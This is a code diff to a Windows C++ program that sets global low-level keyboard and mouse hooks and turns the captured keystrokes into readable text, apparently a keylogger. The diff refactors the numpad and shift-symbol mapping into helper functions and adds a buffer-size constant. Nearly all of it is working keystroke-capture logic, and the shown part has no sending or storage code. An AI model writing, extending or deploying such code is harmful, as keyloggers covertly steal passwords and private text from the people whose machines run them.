@@ -12,6 +12,8 @@
     #include <iostream>
 #endif
 
+#define LPSTR_SIZE 0xFF
+
 //Global variables
 HHOOK mousehook;
 HHOOK keyboardhook;
@@ -32,6 +34,8 @@ void ReleaseMouseHook();
 void ReleaseKeyboardHook();
 void ReleaseHooks();
 bool IfPrintable(char* str);
+void CheckNumpad(char* str, bool numlock, bool shortcut);
+void CheckSpecialChar(char *str);
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
@@ -74,7 +78,7 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
         static bool numlock = GetKeyState(VK_NUMLOCK);
         bool shortcut = false;
         kbd_struct = *((KBDLLHOOKSTRUCT*)lParam);
-        char str[0xFF] = {0};
+        char str[LPSTR_SIZE] = {0};
         DWORD msg = 1;
         bool printable;
 
@@ -86,7 +90,7 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
         else {
             msg += (kbd_struct.flags << 24);
         }
-        GetKeyNameText(msg, str, 0xFF);
+        GetKeyNameText(msg, str, LPSTR_SIZE);
         // std::cout << "DEBUG:\t" << str << "\tvk:\t" << kbd_struct.vkCode << "\tscan:\t" << kbd_struct.scanCode << "\tflag:\t" << kbd_struct.flags << "\n";   
         // std::cout << "TEST:\t" << (kbd_struct.flags & LLKHF_EXTENDED) << /*"\txor:\t" << (kbd_struct.flags ^ LLKHF_EXTENDED) <<*/ "\n";    
 
@@ -98,7 +102,7 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
                 if (strcmp(str, "Caps Lock") == 0) {
                     capslock = !capslock;
                 }
-                else if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {   // RIGHT SHIFT NOT WORKING
+                else if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {
                     shift = true;
                 }
                 else if (strcmp(str, "Num Lock") == 0) {
@@ -106,110 +110,30 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
                 }
 
                 if ((strcmp(str, "Enter") == 0) || (strcmp(str, "Num Enter") == 0)) {
-                    strncpy(str, "\n", 0xFF);
-                    printable = true;
+                    strncpy(str, "\n", LPSTR_SIZE);
+                    // printable = true;
                     shortcut = true;
                 }
                 else if (strcmp(str, "Space") == 0) {
-                    strncpy(str, " ", 0xFF);
-                    printable = true;
+                    strncpy(str, " ", LPSTR_SIZE);
+                    // printable = true;
                     shortcut = true;
                 }
                 else if (strcmp(str, "Tab") == 0) {
-                    strncpy(str, "\t", 0xFF);
-                    printable = true;
+                    strncpy(str, "\t", LPSTR_SIZE);
+                    // printable = true;
                     shortcut = true;
                 }
                 else {
-                    char tmp[0xFF] = {0};
-                    snprintf(tmp, 0xFF, "[%s]", str);
-                    strncpy(str, tmp, 0xFF);
+                    char tmp[LPSTR_SIZE] = {0};
+                    snprintf(tmp, LPSTR_SIZE, "[%s]", str);
+                    strncpy(str, tmp, LPSTR_SIZE);
                 }
-                //Cause there is no known method to me to map it automatically,
-                //I have to do it manually
-                //Not using C++ map, bcs of binary size
-                if (numlock && !shortcut) {
-                    if (strcmp(str, "[Num 0]") == 0) {
-                        strncpy(str, "0", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 1]") == 0) {
-                        strncpy(str, "1", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 2]") == 0) {
-                        strncpy(str, "2", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 3]") == 0) {
-                        strncpy(str, "3", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 4]") == 0) {
-                        strncpy(str, "4", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 5]") == 0) {
-                        strncpy(str, "5", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 6]") == 0) {
-                        strncpy(str, "6", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 7]") == 0) {
-                        strncpy(str, "7", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 8]") == 0) {
-                        strncpy(str, "8", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 9]") == 0) {
-                        strncpy(str, "9", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num Del]") == 0) {
-                        strncpy(str, "[,]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num +]") == 0) {
-                        strncpy(str, "+", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num -]") == 0) {
-                        strncpy(str, "-", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num *]") == 0) {
-                        strncpy(str, "*", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num /]") == 0) {
-                        strncpy(str, "/", 0xFF);
-                    }
-                }
-                else if (!shortcut) {
-                    if (strcmp(str, "[Num 0]") == 0) {
-                        strncpy(str, "[Insert]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 1]") == 0) {
-                        strncpy(str, "[End]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 2]") == 0) {
-                        strncpy(str, "[Down]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 3]") == 0) {
-                        strncpy(str, "[Page Down]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 4]") == 0) {
-                        strncpy(str, "[Left]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 5]") == 0) {
-                        strncpy(str, "[]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 6]") == 0) {
-                        strncpy(str, "[Right]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 7]") == 0) {
-                        strncpy(str, "[Home]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 8]") == 0) {
-                        strncpy(str, "[Up]", 0xFF);
-                    }
-                    else if (strcmp(str, "[Num 9]") == 0) {
-                        strncpy(str, "[Page Up]", 0xFF);
-                    }
-                }
+            
+                CheckNumpad(str, numlock, shortcut);
             }
 
-            if (printable) {
+            else if (printable) {
                 int val = int(str[0]);
                 if (((val >= 65) && (val <= 90)) || (val >= 97 && val <= 122)) {
                     if (shift == capslock) {
@@ -221,67 +145,7 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
                 }
                 else {
                     if (shift) {
-                        //Same situation - function now available, map too big
-                        if (strcmp(str, "1") == 0) {
-                            strncpy(str, "!", 0xFF);
-                        }
-                        else if (strcmp(str, "2") == 0) {
-                            strncpy(str, "@", 0xFF);
-                        }
-                        else if (strcmp(str, "3") == 0) {
-                            strncpy(str, "#", 0xFF);
-                        }
-                        else if (strcmp(str, "4") == 0) {
-                            strncpy(str, "$", 0xFF);
-                        }
-                        else if (strcmp(str, "5") == 0) {
-                            strncpy(str, "%", 0xFF);
-                        }
-                        else if (strcmp(str, "6") == 0) {
-                            strncpy(str, "^", 0xFF);
-                        }
-                        else if (strcmp(str, "7") == 0) {
-                            strncpy(str, "&", 0xFF);
-                        }
-                        else if (strcmp(str, "8") == 0) {
-                            strncpy(str, "*", 0xFF);
-                        }
-                        else if (strcmp(str, "9") == 0) {
-                            strncpy(str, "(", 0xFF);
-                        }
-                        else if (strcmp(str, "0") == 0) {
-                            strncpy(str, ")", 0xFF);
-                        }
-                        else if (strcmp(str, "-") == 0) {
-                            strncpy(str, "_", 0xFF);
-                        }
-                        else if (strcmp(str, "=") == 0) {
-                            strncpy(str, "+", 0xFF);
-                        }
-                        else if (strcmp(str, "[") == 0) {
-                            strncpy(str, "{", 0xFF);
-                        }
-                        else if (strcmp(str, "]") == 0) {
-                            strncpy(str, "}", 0xFF);
-                        }
-                        else if (strcmp(str, "\\") == 0) {
-                            strncpy(str, "|", 0xFF);
-                        }
-                        else if (strcmp(str, ";") == 0) {
-                            strncpy(str, ":", 0xFF);
-                        }
-                        else if (strcmp(str, "'") == 0) {
-                            strncpy(str, "\"", 0xFF);
-                        }
-                        else if (strcmp(str, ",") == 0) {
-                            strncpy(str, "<", 0xFF);
-                        }
-                        else if (strcmp(str, ".") == 0) {
-                            strncpy(str, ">", 0xFF);
-                        }
-                        else if (strcmp(str, "/") == 0) {
-                            strncpy(str, "?", 0xFF);
-                        }
+                        CheckSpecialChar(str);
                     }
                 }
             }
@@ -347,4 +211,153 @@ void ReleaseHooks() {
 
 bool IfPrintable(char* str) {
     return ((strlen(str) <= 1) ? true : false);
+}
+
+void CheckNumpad(char* str, bool numlock, bool shortcut) {
+//Cause there is no known method to me to map it automatically,
+//I have to do it manually
+//Not using C++ map, bcs of binary size
+    if (numlock && !shortcut) {
+        if (strcmp(str, "[Num 0]") == 0) {
+            strncpy(str, "0", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 1]") == 0) {
+            strncpy(str, "1", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 2]") == 0) {
+            strncpy(str, "2", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 3]") == 0) {
+            strncpy(str, "3", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 4]") == 0) {
+            strncpy(str, "4", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 5]") == 0) {
+            strncpy(str, "5", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 6]") == 0) {
+            strncpy(str, "6", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 7]") == 0) {
+            strncpy(str, "7", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 8]") == 0) {
+            strncpy(str, "8", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 9]") == 0) {
+            strncpy(str, "9", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num Del]") == 0) {
+            strncpy(str, "[,]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num +]") == 0) {
+            strncpy(str, "+", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num -]") == 0) {
+            strncpy(str, "-", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num *]") == 0) {
+            strncpy(str, "*", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num /]") == 0) {
+            strncpy(str, "/", LPSTR_SIZE);
+        }
+    }
+    else if (!shortcut) {
+        if (strcmp(str, "[Num 0]") == 0) {
+            strncpy(str, "[Insert]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 1]") == 0) {
+            strncpy(str, "[End]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 2]") == 0) {
+            strncpy(str, "[Down]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 3]") == 0) {
+            strncpy(str, "[Page Down]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 4]") == 0) {
+            strncpy(str, "[Left]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 5]") == 0) {
+            strncpy(str, "[]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 6]") == 0) {
+            strncpy(str, "[Right]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 7]") == 0) {
+            strncpy(str, "[Home]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 8]") == 0) {
+            strncpy(str, "[Up]", LPSTR_SIZE);
+        }
+        else if (strcmp(str, "[Num 9]") == 0) {
+            strncpy(str, "[Page Up]", LPSTR_SIZE);
+        }
+    }
+}
+
+void CheckSpecialChar(char* str) {
+//Same situation - function now available, map too big
+    if (str[0] == *"1") {
+        str[0] = '!';
+    }
+    else if (str[0] == *"2") {
+        str[0] = '@';
+    }
+    else if (str[0] == *"3") {
+        str[0] = '#';
+    }
+    else if (str[0] == *"4") {
+        str[0] = '$';
+    }
+    else if (str[0] == *"5") {
+        str[0] = '%';
+    }
+    else if (str[0] == *"6") {
+        str[0] = '^';
+    }
+    else if (str[0] == *"7") {
+        str[0] = '&';
+    }
+    else if (str[0] == *"8") {
+        str[0] = '*';
+    }
+    else if (str[0] == *"9") {
+        str[0] = '(';
+    }
+    else if (str[0] == *"0") {
+        str[0] = ')';
+    }
+    else if (str[0] == *"-") {
+        str[0] = '_';
+    }
+    else if (str[0] == *"=") {
+        str[0] = '+';
+    }
+    else if (str[0] == *"[") {
+        str[0] = '{';
+    }
+    else if (str[0] == *"]") {
+        str[0] = '}';
+    }
+    else if (str[0] == *"\\") {
+        str[0] = '|';
+    }
+    else if (str[0] == *";") {
+        str[0] = ':';
+    }
+    else if (str[0] == *"'") {
+        str[0] = '"';
+    }
+    else if (str[0] == *",") {
+        str[0] = '<';
+    }
+    else if (str[0] == *".") {
+        str[0] = '>';
+    }
+    else if (str[0] == *"/") {
+        str[0] = '?';
+    }
 }
